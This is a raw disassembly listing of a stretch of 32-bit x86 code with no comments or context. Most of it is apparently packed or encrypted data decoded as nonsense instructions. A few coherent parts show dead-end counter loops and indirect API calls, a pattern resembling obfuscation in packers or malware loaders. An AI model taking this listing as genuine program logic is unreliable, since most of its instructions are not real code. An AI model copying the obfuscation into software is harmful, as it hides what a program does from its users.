  40726f:	pop    ds
  407270:	test   DWORD PTR [esi+0x183f86df],edx
  407276:	stc    
  407277:	jge    0x40728a
  407279:	fldenv [edx-0x49f8770b]
  40727f:	fwait
  407280:	mov    dh,0x36
  407282:	out    0xeb,eax
  407284:	and    BYTE PTR [eax+0xf8ea2f2],bl
  40728a:	xchg   esp,eax
  40728b:	(bad)  
  40728c:	aaa    
  40728d:	daa    
  40728e:	(bad)  
  40728f:	(bad)  
  407290:	fidiv  WORD PTR [ebp-0x37]
  407293:	push   esi
  407294:	enter  0xb4de,0xd3
  407298:	pop    ecx
  407299:	icebp  
  40729a:	neg    BYTE PTR [ebp-0x4381624b]
  4072a0:	ss jecxz 0x407298
  4072a3:	cmp    ebx,DWORD PTR [esi+esi*2]
  4072a6:	int3   
  4072a7:	mov    al,0x97
  4072a9:	cwde   
  4072aa:	call   0x7dff7e25
  4072af:	pop    es
  4072b0:	test   eax,esi
  4072b2:	jo     0x4072ae
  4072b4:	dec    BYTE PTR [edi-0x46ba354d]
  4072ba:	sub    BYTE PTR [edx-0x3912a05d],bh
  4072c0:	mov    ch,0xee
  4072c2:	call   0x2bc30b35
  4072c7:	je     0x40727b
  4072c9:	jg     0x4072be
  4072cb:	in     eax,dx
  4072cc:	ja     0x40733f
  4072ce:	pop    ds
  4072cf:	mov    eax,ds:0x2dc5e397
  4072d4:	lahf   
  4072d5:	jl     0x4072f8
  4072d7:	dec    edx
  4072d8:	rcr    BYTE PTR [ecx],cl
  4072da:	mov    ch,0x71
  4072dc:	stos   BYTE PTR es:[edi],al
  4072dd:	jb     0x407314
  4072df:	sub    cl,BYTE PTR [ebp-0x21]
  4072e2:	inc    edi
  4072e3:	mov    ebx,DWORD PTR [edi]
  4072e5:	push   es
  4072e6:	test   BYTE PTR [ecx+0x42],ch
  4072e9:	inc    ebp
  4072ea:	leave  
  4072eb:	adc    eax,0x20c85733
  4072f0:	pop    edx
  4072f1:	fnstenv gs:[ecx+edi*4]
  4072f5:	popa   
  4072f6:	lock hlt 
  4072f8:	inc    eax
  4072f9:	stos   BYTE PTR es:[edi],al
  4072fa:	dec    edx
  4072fb:	jnp    0x40736a
  4072fd:	lahf   
  4072fe:	xlat   BYTE PTR ds:[ebx]
  4072ff:	inc    BYTE PTR [eax-0x76]
  407302:	mov    ah,BYTE PTR [edi]
  407304:	jns    0x4072a9
  407306:	push   eax
  407307:	push   eax
  407308:	or     esi,DWORD PTR [ebp+edx*1-0x23]
  40730c:	out    0x49,eax
  40730e:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  407310:	mov    edx,0xd7f91fa6
  407315:	cmp    DWORD PTR [esi],edx
  407317:	mov    edx,0x9a487b78
  40731c:	mov    edx,DWORD PTR [ebx+ebx*2]
  40731f:	rcr    DWORD PTR [edi],cl
  407321:	and    eax,0x45b679ec
  407326:	das    
  407327:	inc    eax
  407328:	sbb    BYTE PTR [ebx],0xdc
  40732b:	pop    edx
  40732c:	dec    eax
  40732d:	or     ebp,DWORD PTR [edi+0x46]
  407330:	cld    
  407331:	mov    eax,ebx
  407333:	fdivr  st(5),st
  407335:	or     dl,BYTE PTR [edx]
  407337:	pop    ecx
  407338:	mov    eax,gs
  40733a:	add    ebx,edx
  40733c:	add    ch,BYTE PTR [edx+0xc]
  40733f:	xchg   edx,eax
  407340:	call   0x411b:0x1a6b3299
  407347:	fmul   DWORD PTR [edi+0xf]
  40734a:	test   BYTE PTR [edi],ah
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x4337d7,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x4338ab
  40736f:	or     DWORD PTR ds:0x4338af,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x4073f7
  407387:	sar    esp,0x27
  40738a:	or     al,dl
  40738c:	jle    0x40740c
  40738e:	add    eax,0x927e7e7c
  407393:	xor    eax,0xcdbee5b8
  407398:	enter  0x2843,0x3e
  40739c:	les    edi,FWORD PTR [edi]
  40739e:	push   ebx
  40739f:	mov    ds:0x6e150e8b,eax
  4073a4:	lahf   
  4073a5:	cmp    edi,0x8b200afe
  4073ab:	shl    DWORD PTR [ecx],cl
  4073ad:	adc    DWORD PTR [eax],0xd1971cd2
  4073b3:	repz push es
  4073b5:	push   ebp
  4073b6:	out    0xb1,al
  4073b8:	inc    BYTE PTR [ebp-0x62]
  4073bb:	into   
  4073bc:	ror    BYTE PTR [ebp+0x5f182232],1
  4073c2:	jmp    0x40743d
  4073c4:	push   ebx
  4073c5:	stos   BYTE PTR es:[edi],al
  4073c6:	retw   0xb31e
  4073ca:	jge    0x4073f7
  4073cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073cd:	bound  ebp,QWORD PTR [edx]
  4073cf:	ja     0x4073d4
  4073d1:	rcr    DWORD PTR [edx+0x34cc97cd],cl
  4073d7:	mov    DWORD PTR [edi-0x4e5c229],ecx
  4073dd:	cmp    bl,al
  4073df:	fldenv [ebp+0x0]
  4073e2:	sahf   
  4073e3:	sbb    DWORD PTR ds:0x640db73b,edi
  4073e9:	mov    edx,0x885a92b4
  4073ee:	xlat   BYTE PTR ds:[ebx]
  4073ef:	and    eax,0xdf861a61
  4073f4:	ror    BYTE PTR [edx+ebx*4+0x1e5f2768],0x4b
  4073fc:	pop    es
  4073fd:	cmp    dh,BYTE PTR [edx]
  4073ff:	add    dh,BYTE PTR [esi]
  407401:	xchg   esp,eax
  407402:	jecxz  0x407417
  407404:	dec    esp
  407405:	retf   
  407406:	popf   
  407407:	adc    DWORD PTR [edx-0x63258b58],eax
  40740d:	push   ebx
  40740e:	jnp    0x4073ea
  407410:	les    ebp,FWORD PTR [edx]
  407412:	(bad)  
  407414:	pushf  
  407415:	xor    esi,ebp
  407417:	ror    BYTE PTR [ebx+0xcf3e5d1],1
  40741d:	push   edi
  40741e:	cld    
  40741f:	pushf  
  407420:	inc    eax
  407421:	sbb    esp,DWORD PTR [esi]
  407423:	scas   eax,DWORD PTR es:[edi]
  407424:	sub    eax,0x526866af
  407429:	aaa    
  40742a:	hlt    
  40742b:	jb     0x4073de
  40742d:	sbb    BYTE PTR [ecx],dh
  40742f:	call   0x4329:0x479eab71
  407436:	mov    WORD PTR [ebx*1-0x286a69a9],fs
  40743d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40743e:	pushf  
  40743f:	sub    DWORD PTR [edx+0x6952ee1],esp
  407445:	daa    
  407446:	imul   edi,DWORD PTR [esi-0x31],0xffffffb3
  40744a:	cld    
  40744b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40744c:	push   esp
  40744d:	mov    ds:0x5377d57a,al
  407452:	adc    al,0xbd
  407454:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407455:	mov    al,ds:0xa725e4cd
  40745a:	jo     0x407402
  40745c:	enterw 0x9c2c,0x1b
  407461:	cmp    cl,BYTE PTR [esi-0x24]
  407464:	(bad)  
  407465:	in     eax,0x3
  407467:	xchg   bh,al
  407469:	jns    0x4074b3
  40746b:	xor    esi,DWORD PTR [esi]
  40746d:	add    ecx,ebp
  40746f:	xchg   edx,eax
  407470:	jae    0x407437
  407472:	sbb    esp,DWORD PTR [eax-0x3042c64c]
  407478:	loope  0x40743d
  40747a:	mov    bl,0xf3
  40747c:	lods   eax,DWORD PTR ds:[esi]
  40747d:	ss mov eax,0xb64a773e
  407483:	xor    eax,esp
  407485:	add    DWORD PTR [ecx],ebx
  407487:	pop    ecx
  407488:	or     esi,0x1c2054ae
  40748e:	xchg   edx,eax
  40748f:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407491:	mov    DWORD PTR [ebp+0x38],esp
  407494:	jp     0x407493
  407496:	neg    BYTE PTR cs:[ecx]
  407499:	adc    DWORD PTR [ebx],ebx
  40749b:	or     ch,ch
  40749d:	out    dx,eax
  40749e:	mov    BYTE PTR fs:0xf13dd803,ah
  4074a5:	cmp    al,0x63
  4074a7:	jmp    0x2e6b:0xaa4da710
  4074ae:	xor    eax,0xaa0311fb
  4074b3:	je     0x407496
  4074b5:	pop    ecx
  4074b6:	es loopne 0x4074f3
  4074b9:	sub    al,0xbf
  4074bb:	mov    eax,ds:0xaf33471f
  4074c0:	mov    WORD PTR [esi+0x642bfb1d],?
  4074c6:	cld    
  4074c7:	out    0xd7,al
  4074c9:	push   esi
  4074ca:	je     0x407450
  4074cc:	aaa    
  4074cd:	inc    eax
  4074ce:	test   al,0xb7
  4074d0:	int    0xb1
  4074d2:	push   0x59f8edef
  4074d7:	mov    bl,0x9d
  4074d9:	out    dx,eax
  4074da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074db:	cmp    DWORD PTR [ebx],0xbec1b277
  4074e1:	sbb    DWORD PTR [edx],eax
  4074e3:	sbb    ch,BYTE PTR [eax]
  4074e5:	sbb    eax,0x244c5a9f
  4074ea:	rcl    BYTE PTR [edx+edx*8-0x6396b1bc],cl
  4074f1:	sbb    bh,BYTE PTR [edi+0x2d71658b]
  4074f7:	xchg   ebx,eax
  4074f8:	mov    ch,BYTE PTR [ebp-0x7db94990]
  4074fe:	pop    esp
  4074ff:	pop    ecx
  407500:	int    0x35
  407502:	data16 xor BYTE PTR [edi+ebp*8-0x6840b994],dl
  40750a:	jns    0x40755a
  40750c:	stos   BYTE PTR es:[edi],al
  40750d:	mov    eax,ds:0xd59e4465
  407512:	add    BYTE PTR [esi],ch
  407514:	cs or  al,0x3c
  407517:	xchg   ebx,eax
  407518:	nop
  407519:	scas   eax,DWORD PTR es:[edi]
  40751a:	and    DWORD PTR [edx+0x6b700032],ecx
  407520:	(bad)  
  407522:	lods   eax,DWORD PTR ds:[esi]
  407523:	retf   0xdeb9
  407526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407527:	dec    esp
  407528:	jmp    0x2e2ddcc
  40752d:	loope  0x4074dd
  40752f:	std    
  407530:	dec    edx
  407531:	fiadd  WORD PTR [eax+0x64]
  407534:	cmp    DWORD PTR [eax-0x3c],ebp
  407537:	jmp    0xf777c2ac
  40753c:	ror    DWORD PTR [edi+ebp*2-0x655c347e],cl
  407543:	std    
  407544:	in     eax,dx
  407545:	mov    ebx,0xa1e471a0
  40754a:	and    DWORD PTR [edi+0x510a214],ebx
  407550:	sbb    bh,dl
  407552:	or     eax,0x34f5da95
  407557:	mov    eax,0x6da41a5c
  40755c:	out    0xa2,al
  40755e:	push   esp
  40755f:	into   
  407560:	shl    DWORD PTR cs:[ebx+0x674af3cd],cl
  407567:	push   es
  407568:	jle    0x1b613971
  40756e:	xor    dh,ah
  407570:	push   esp
  407571:	fs dec esp
  407573:	xor    BYTE PTR [ecx-0xff41f43],dl
  407579:	inc    ebx
  40757a:	jmp    0x3908:0x3aabbf57
  407581:	lds    eax,FWORD PTR [ebx]
  407583:	jns    0x4075dd
  407585:	mov    esp,0xa841ea7
  40758a:	mov    dh,0xb9
  40758c:	jmp    0x40751d
  40758e:	(bad)  
  40758f:	jmp    0x40759e
  407591:	mov    esp,0x48a1d645
  407596:	pushf  
  407597:	fisttp QWORD PTR [edx-0x14]
  40759a:	int    0x9d
  40759c:	xor    al,bh
  40759e:	inc    ebp
  40759f:	in     al,dx
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x4337d3
  4075b4:	sub    DWORD PTR ds:0x43378f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x43377f
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x4337eb,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43378f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43378f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43378f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43378f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43378f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	pop    ss
  407656:	xchg   edx,eax
  407657:	inc    ebp
  407658:	mov    ds:0x7e7ec011,al
  40765d:	add    eax,0x177e7e7c
  407662:	loop   0x40767f
  407664:	and    eax,DWORD PTR [eax+edi*2+0xa]
  407668:	add    BYTE PTR [ebp-0x8],bl
  40766b:	out    dx,eax
  40766c:	sub    ebp,DWORD PTR [edi+eiz*4-0x1f891e72]
  407673:	fisubr WORD PTR [ebx]
  407675:	lds    esi,FWORD PTR [ebx+0x6]
  407678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407679:	aad    0xd0
  40767b:	inc    edi
  40767c:	imul   ecx,ebp,0x4c
  40767f:	sub    DWORD PTR [esi],ecx
  407681:	mov    dh,0xb5
  407683:	rcr    BYTE PTR [esi-0x66ddaa08],1
  407689:	add    BYTE PTR [ebx+0x5739b4a6],ah
  40768f:	xchg   ebp,eax
  407690:	and    eax,0x4d219181
  407695:	ss mov esi,0xc6cb1fe8
  40769b:	mul    BYTE PTR [ecx+0x56a84e69]
  4076a1:	and    eax,0xd378d2fb
  4076a6:	mov    ecx,0x354a8d79
  4076ab:	call   0x1d2b:0xd3e36e13
  4076b2:	pop    eax
  4076b3:	sub    BYTE PTR ds:0xb981d94,dl
  4076b9:	das    
  4076ba:	add    esp,DWORD PTR [edx+0x19]
  4076bd:	mov    ch,0x87
  4076bf:	outs   dx,BYTE PTR ds:[esi]
  4076c0:	sub    eax,0xdadfb321
  4076c5:	cld    
  4076c6:	out    dx,al
  4076c7:	nop
  4076c8:	(bad)  
  4076c9:	pop    ds
  4076ca:	and    edx,DWORD PTR [esi+0x7a]
  4076cd:	lods   eax,DWORD PTR ds:[esi]
  4076ce:	rcl    esi,cl
  4076d0:	shl    BYTE PTR [ebx],cl
  4076d2:	(bad)  
  4076d3:	xor    eax,0xdb268b53
  4076d8:	jbe    0x40774a
  4076da:	and    ch,cl
  4076dc:	frstor [ebp+0x58]
  4076df:	jo     0x40769a
  4076e1:	(bad)  
  4076e2:	mov    bh,0x9a
  4076e4:	out    dx,al
  4076e5:	xchg   ebx,eax
  4076e6:	loopne 0x4076c7
  4076e8:	mov    ds:0x2e67fd8c,eax
  4076ed:	(bad)  
  4076ee:	dec    ebp
  4076ef:	ret    
  4076f0:	push   edx
  4076f1:	into   
  4076f2:	push   ecx
  4076f3:	and    ah,BYTE PTR [esp+eiz*2]
  4076f6:	shr    BYTE PTR [eax+ebx*2-0x2a8fe0d7],1
  4076fd:	jnp    0x407717
  4076ff:	adc    al,0x2a
  407701:	call   0x9a2b:0xf80d1dd2
  407708:	add    ch,ah
  40770a:	data16 stc 
  40770c:	and    BYTE PTR [ebp-0x39],dl
  40770f:	ds jno 0x4076ee
  407712:	xor    eax,0x1679b38a
  407717:	mov    ebx,eax
  407719:	jecxz  0x4076a6
  40771b:	lea    esp,[ecx]
  40771d:	xor    eax,DWORD PTR [edx]
  40771f:	xchg   ebx,eax
  407720:	(bad)  [ecx]
  407722:	and    edi,esp
  407724:	sar    BYTE PTR [esi],cl
  407726:	mov    dl,0xe5
  407728:	xchg   dh,dh
  40772a:	mov    edx,0x3af16864
  40772f:	es pushf 
  407731:	lds    ecx,FWORD PTR [ecx]
  407733:	lods   eax,DWORD PTR ds:[esi]
  407734:	imul   edx,DWORD PTR [esi+edx*8],0x7
  407738:	pop    ecx
  407739:	and    DWORD PTR [ebp+0x1],0xffffff91
  40773d:	inc    eax
  40773e:	cs push esp
  407740:	dec    edi
  407741:	mov    ebp,0xe443cd70
  407746:	test   al,0x77
  407748:	mov    esi,0xbb00e093
  40774d:	shr    BYTE PTR [ebp+0x7c98aeff],cl
  407753:	dec    ebp
  407754:	sahf   
  407755:	out    0x2,al
  407757:	and    DWORD PTR [edi-0x11],esp
  40775a:	in     al,dx
  40775b:	cmp    BYTE PTR [esi-0x1c45a04a],bl
  407761:	hlt    
  407762:	xchg   edx,eax
  407763:	xor    esi,DWORD PTR [edi+ebx*1]
  407766:	dec    ebp
  407767:	jbe    0x40776e
  407769:	push   0xffffff86
  40776b:	jecxz  0x40778a
  40776d:	out    0x4b,eax
  40776f:	sbb    DWORD PTR [ecx],ebp
  407771:	cli    
  407772:	pop    ebp
  407773:	xlat   BYTE PTR ds:[ebx]
  407774:	addr16 jmp 0x9153:0xd8e7af81
  40777c:	mov    eax,ds:0x481db170
  407781:	sub    eax,0x31a6e0b4
  407786:	xchg   esi,eax
  407787:	jo     0x4077b3
  407789:	hlt    
  40778a:	push   ecx
  40778b:	push   esi
  40778c:	pop    esi
  40778d:	iret   
  40778e:	dec    ebp
  40778f:	mov    eax,ds:0x683e407c
  407794:	stc    
  407795:	xor    dl,BYTE PTR [ebx]
  407797:	mov    eax,ds:0x36424952
  40779c:	ficom  DWORD PTR [edx+ebp*8]
  40779f:	lea    ebx,[esi]
  4077a1:	test   eax,0x5ef9c7b6
  4077a6:	sbb    ch,BYTE PTR [edx]
  4077a8:	xor    esi,DWORD PTR [edx+ecx*4-0x2b]
  4077ac:	and    al,0xb7
  4077ae:	dec    esp
  4077af:	jnp    0x4077f2
  4077b1:	mov    dl,0x55
  4077b3:	cdq    
  4077b4:	retf   0x747a
  4077b7:	ror    bl,0x5b
  4077ba:	jle    0x4077f3
  4077bc:	push   ds
  4077bd:	mov    ds:0x1fc015cb,al
  4077c2:	rcr    DWORD PTR [esi-0x19],0x93
  4077c6:	pop    edi
  4077c7:	mov    ah,BYTE PTR [ebx+0x15]
  4077ca:	inc    eax
  4077cb:	pop    ebx
  4077cc:	xlat   BYTE PTR ds:[ebx]
  4077cd:	and    eax,0x9637fd2
  4077d2:	out    0xbc,al
  4077d4:	ror    ch,0xd4
  4077d7:	mov    esp,0x7e9592d1
  4077dc:	fwait
  4077dd:	mov    al,ds:0xc936e1c3
  4077e2:	pop    ebp
  4077e3:	dec    ebx
  4077e4:	out    dx,eax
  4077e5:	or     eax,0xe6da4a5a
  4077ea:	fsubr  DWORD PTR [eax-0x56c16c70]
  4077f0:	popa   
  4077f1:	sti    
  4077f2:	adc    eax,0xfdfe8d23
  4077f8:	cli    
  4077f9:	int3   
  4077fa:	fild   QWORD PTR [ecx-0x3db7d26e]
  407800:	iret   
  407801:	into   
  407802:	(bad)  
  407803:	loopne 0x4077d1
  407805:	pop    edx
  407807:	fcomp  QWORD PTR [ebx+ebx*8+0x5e]
  40780b:	int3   
  40780c:	cwde   
  40780d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40780e:	fcom   DWORD PTR [edi+ebx*2]
  407811:	test   edi,ebx
  407813:	adc    edx,DWORD PTR [edx]
  407815:	xchg   esi,eax
  407816:	or     al,0x8f
  407819:	or     al,0xcb
  40781b:	hlt    
  40781c:	mov    ss,WORD PTR [ebx-0x37a1928]
  407822:	jno    0x40783d
  407824:	dec    esp
  407825:	cmp    al,0xb5
  407827:	enter  0x42be,0xae
  40782b:	int    0xf2
  40782d:	imul   ebp,DWORD PTR [edi],0x350b0bdc
  407833:	mov    dl,0x9d
  407835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407836:	lods   al,BYTE PTR ds:[esi]
  407837:	pushf  
  407838:	mov    bl,0x93
  40783a:	jle    0x4077cb
  40783c:	iret   
  40783d:	ins    BYTE PTR es:[edi],dx
  40783e:	xchg   edx,eax
  40783f:	or     eax,0x1a1df39e
  407844:	mov    dl,0x7c
  407846:	inc    eax
  407847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407848:	scas   eax,DWORD PTR es:[edi]
  407849:	fmul   QWORD PTR [ecx-0x33]
  40784c:	inc    edx
  40784d:	test   ch,cl
  40784f:	lods   eax,DWORD PTR ds:[esi]
  407850:	in     eax,dx
  407851:	mov    ebp,0x3b0848f1
  407856:	mov    ds:0x2a1e1a59,eax
  40785b:	mov    cl,0x12
  40785d:	(bad)  
  40785e:	stos   DWORD PTR es:[edi],eax
  40785f:	call   0x860e2ac2
  407864:	cwde   
  407865:	call   0x54f401c8
  40786a:	xor    DWORD PTR [ecx],esp
  40786c:	push   esi
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x43377f,0x4337e3
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43389b,0x12
  40788b:	cmp    DWORD PTR ds:0x43389b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43389b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43389b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43389b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43381f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43381f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43381f,esi
  4078e0:	cmp    DWORD PTR ds:0x43381f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43381f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x18,eax
  407922:	cdq    
  407923:	sub    DWORD PTR [edx+0x24],ebp
  407926:	into   
  407927:	jle    0x4079a7
  407929:	add    eax,0x6a7e7e7c
  40792e:	test   DWORD PTR [ebx],eax
  407930:	lock jmp 0x4079ab
  407933:	cdq    
  407934:	pop    ss
  407935:	cmc    
  407936:	int    0x67
  407938:	fs imul BYTE PTR gs:[edx+0x56525ee0]
  407940:	or     ebp,ebx
  407942:	xor    eax,0x8ca14c67
  407947:	push   ebp
  407948:	shl    DWORD PTR [edi],cl
  40794a:	outs   dx,BYTE PTR ds:[esi]
  40794b:	retf   0x62b6
  40794e:	pop    eax
  40794f:	or     dh,BYTE PTR [edx+0x79]
  407952:	jmp    0x4079b0
  407954:	loope  0x4078fd
  407956:	stos   DWORD PTR es:[edi],eax
  407957:	jecxz  0x4079a3
  407959:	mov    al,ds:0xd7f72960
  40795e:	mov    cl,0xd
  407960:	loopne 0x4078e4
  407962:	test   DWORD PTR [edi],esi
  407964:	ins    BYTE PTR es:[edi],dx
  407965:	pop    edx
  407966:	loopne 0x4079e5
  407968:	mov    cs,WORD PTR [edx+ecx*8+0x31]
  40796c:	into   
  40796d:	fisttp WORD PTR ss:[esi]
  407970:	aaa    
  407971:	fsubr  st(6),st
  407973:	or     al,0x4
  407975:	sbb    esi,DWORD PTR [esp+eax*4]
  407978:	jnp    0x4079d7
  40797a:	and    al,0x4
  40797c:	fstp   DWORD PTR [edx-0x80]
  40797f:	dec    DWORD PTR [ebx]
  407981:	jp     0x407921
  407983:	pop    ebp
  407984:	mov    edi,0x5a752307
  407989:	mov    al,ds:0x5afd2353
  40798e:	and    al,0x45
  407990:	or     dl,BYTE PTR [ebx]
  407992:	hlt    
  407993:	cdq    
  407994:	shl    esi,1
  407996:	xlat   BYTE PTR ds:[ebx]
  407997:	mov    bh,0x7f
  407999:	in     al,dx
  40799a:	aaa    
  40799b:	add    eax,0x1130cd8e
  4079a0:	in     al,dx
  4079a1:	mov    ah,BYTE PTR ds:0x598701b2
  4079a7:	aaa    
  4079a8:	dec    esi
  4079a9:	dec    edx
  4079aa:	fdivr  QWORD PTR [ecx-0x47]
  4079ad:	mov    eax,0x1bdbc5b8
  4079b2:	xlat   BYTE PTR ds:[ebx]
  4079b3:	jp     0x4079e4
  4079b5:	adc    edi,DWORD PTR [ebx-0x57]
  4079b8:	loopne 0x4079ff
  4079ba:	mov    ds:0x887167a4,al
  4079bf:	imul   edi,DWORD PTR [esi+edx*8],0xfffffffa
  4079c3:	jg     0x40797b
  4079c5:	xor    eax,0x4527403
  4079ca:	packssdw mm1,QWORD PTR [eax]
  4079cd:	or     dl,BYTE PTR [ebx+ebx*8]
  4079d0:	jns    0x4079b0
  4079d2:	gs retf 
  4079d4:	xor    ah,ch
  4079d6:	dec    esi
  4079d7:	adc    eax,0xd486e17a
  4079dc:	cwde   
  4079dd:	cli    
  4079de:	adc    ecx,DWORD PTR [ecx+0x72]
  4079e1:	fs jno 0x4079f8
  4079e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079e5:	in     al,0x95
  4079e7:	or     eax,0x32dd19f7
  4079ec:	retf   0x6462
  4079ef:	ret    0x9854
  4079f2:	pop    ds
  4079f3:	into   
  4079f4:	retf   0x1fd7
  4079f7:	(bad)  
  4079f8:	adc    eax,0x933eab0d
  4079fd:	jb     0x407a70
  4079ff:	lods   al,BYTE PTR ds:[esi]
  407a00:	leave  
  407a01:	jl     0x4079b9
  407a03:	shl    BYTE PTR [ebx],1
  407a05:	sar    DWORD PTR fs:[ebp+0x54979d30],cl
  407a0c:	cmc    
  407a0d:	loopne 0x407990
  407a0f:	stos   DWORD PTR es:[edi],eax
  407a10:	adc    bh,BYTE PTR [eax+edi*8+0x58acd0bf]
  407a17:	mov    cl,0x46
  407a19:	cmp    esp,ebp
  407a1b:	adc    esp,esi
  407a1d:	adc    BYTE PTR [eax],dh
  407a1f:	lds    eax,FWORD PTR [ecx-0x5f]
  407a22:	lahf   
  407a23:	sbb    ah,dh
  407a25:	inc    eax
  407a26:	xchg   esi,eax
  407a27:	in     eax,dx
  407a28:	inc    eax
  407a29:	xchg   BYTE PTR [esi-0x14a6b2e0],bh
  407a2f:	cmp    eax,0xc7418681
  407a34:	sbb    al,BYTE PTR [edi]
  407a36:	xchg   edx,eax
  407a37:	inc    ecx
  407a38:	mov    eax,0x2e75f530
  407a3d:	loope  0x407a78
  407a3f:	xor    DWORD PTR [esi+0x45bed8e9],edx
  407a45:	inc    ecx
  407a46:	lahf   
  407a47:	cmp    BYTE PTR [edx-0x56],cl
  407a4a:	lods   eax,DWORD PTR ds:[esi]
  407a4b:	loopne 0x407aa7
  407a4d:	inc    esi
  407a4e:	dec    edi
  407a4f:	inc    eax
  407a50:	pushf  
  407a51:	push   ss
  407a52:	cli    
  407a53:	fidivr WORD PTR [ebx]
  407a55:	jne    0x407a6f
  407a57:	mov    dh,0xce
  407a59:	fisubr DWORD PTR [edi]
  407a5b:	cmp    ch,dh
  407a5d:	xor    edx,edx
  407a5f:	in     al,dx
  407a60:	cmp    DWORD PTR [esi],ebx
  407a62:	pop    ebp
  407a63:	mov    eax,0x37cab95b
  407a68:	retf   
  407a69:	call   0x31d:0xc02f7e73
  407a70:	daa    
  407a71:	jbe    0x407a1b
  407a73:	(bad)  [edx]
  407a75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a76:	enter  0x666d,0xcd
  407a7a:	fmul   DWORD PTR [edx+0x12cdf256]
  407a80:	ucomiss xmm3,DWORD PTR [ebp-0x14]
  407a84:	mov    ds:0x7dfea5cb,al
  407a89:	or     BYTE PTR es:[esi-0x19],ah
  407a8d:	and    eax,0x3710f3bb
  407a92:	mov    ah,0x2f
  407a94:	sti    
  407a95:	fwait
  407a96:	in     eax,dx
  407a97:	cli    
  407a98:	fld    TBYTE PTR [ecx+0x550e3390]
  407a9e:	imul   ebp,ecx,0x7
  407aa1:	jns    0x407ad5
  407aa3:	in     al,0x30
  407aa5:	fbld   TBYTE PTR [ebp-0x68d037bf]
  407aab:	mov    ecx,0x3b602fe4
  407ab0:	je     0x407a5d
  407ab2:	hlt    
  407ab3:	rol    BYTE PTR [esi+0x7644dcf7],1
  407ab9:	add    dl,dl
  407abb:	pushf  
  407abc:	cmp    DWORD PTR [edi-0x3637b872],ebx
  407ac2:	mov    ch,0xab
  407ac4:	(bad)  
  407ac5:	pop    edx
  407ac6:	cdq    
  407ac7:	cwde   
